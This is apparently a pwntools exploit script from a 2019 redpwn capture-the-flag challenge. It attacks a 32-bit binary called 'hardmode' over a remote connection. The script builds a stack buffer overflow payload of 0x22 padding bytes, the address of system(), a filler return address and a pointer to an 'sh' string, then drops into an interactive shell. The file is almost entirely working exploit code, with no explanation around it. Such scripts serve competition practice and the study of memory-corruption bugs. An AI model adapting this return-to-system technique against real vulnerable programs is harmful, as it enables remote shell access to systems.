from pwn import *
import time


binpath = './hardmode'
context.binary = binpath
context.terminal = ['tmux', 'split-w', '-h']

elf = ELF(binpath)
libc = elf.libc


gdbscript = '''
gef
b vuln
b *0x8048546
# set follow-fork-mode parent
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
io = process(binpath)
# gdb.attach(io, gdbscript=gdbscript)
io = remote('chall.2019.redpwn.net', 4002)

io.recvuntil("challenge\n")

ret = 0x8048376
popret = 0x804838d
pop4ret = 0x8048638
pop2ret = 0x804863a
pop3ret = 0x8048639

payload = ''
payload += 'A' * 0x22

payload += p32(elf.plt['system'])
payload += p32(0xdeadbeaf)
payload += p32(0x804866c)  # sh # 

io.sendline(payload)

print "Send payload"

time.sleep(1)

io.sendline("exit")


io.interactive()
